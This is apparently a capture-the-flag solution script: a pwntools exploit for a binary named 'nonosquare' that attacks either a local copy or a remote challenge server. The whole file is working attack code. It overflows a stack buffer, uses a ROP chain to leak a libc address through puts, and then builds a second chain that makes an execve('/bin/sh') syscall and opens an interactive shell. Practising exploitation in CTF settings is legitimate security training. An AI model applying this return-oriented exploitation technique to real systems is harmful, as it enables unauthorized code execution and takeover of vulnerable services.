from pwn import *
if args.LOCAL:
        p = process("./nonosquare")
        elf = ELF("./nonosquare")
        libc = elf.libc
else:
        p = remote("challenges.uactf.com.au",30003)
        elf = ELF("./nonosquare")
        libc = ELF("./nonosquare.so")

context.arch = "amd64"

offset = 56
pop_rdi = p64(0x401343)
ret = p64(0x40101a)

pop_r8 = p64(0x40117e)


setbuf = elf.got['setbuf']
puts_plt = elf.sym['puts']
main = elf.sym['main']

payload = b"A" * offset
payload += pop_rdi
payload += p64(setbuf)
payload += ret
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)
p.recvuntil(b"Did you have fun?")
p.recvline()
libc.address = u64(p.recvline().strip().ljust(8,b'\x00')) - libc.sym['setbuf']
success(f"Libc Base Addr: {hex(libc.address)}")

binsh = p64(next(libc.search(b'/bin/sh\x00')))

payload = b"A" * offset
payload += p64(libc.address + 0x15f8c5)
payload += p64(0x3b)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc.address + 0x2601f)
payload += p64(0x0)
payload += p64(libc.address + 0x23b6a)
payload += binsh
payload += p64(libc.address + 0x02284d)

pause()
p.sendline(payload)
p.interactive()
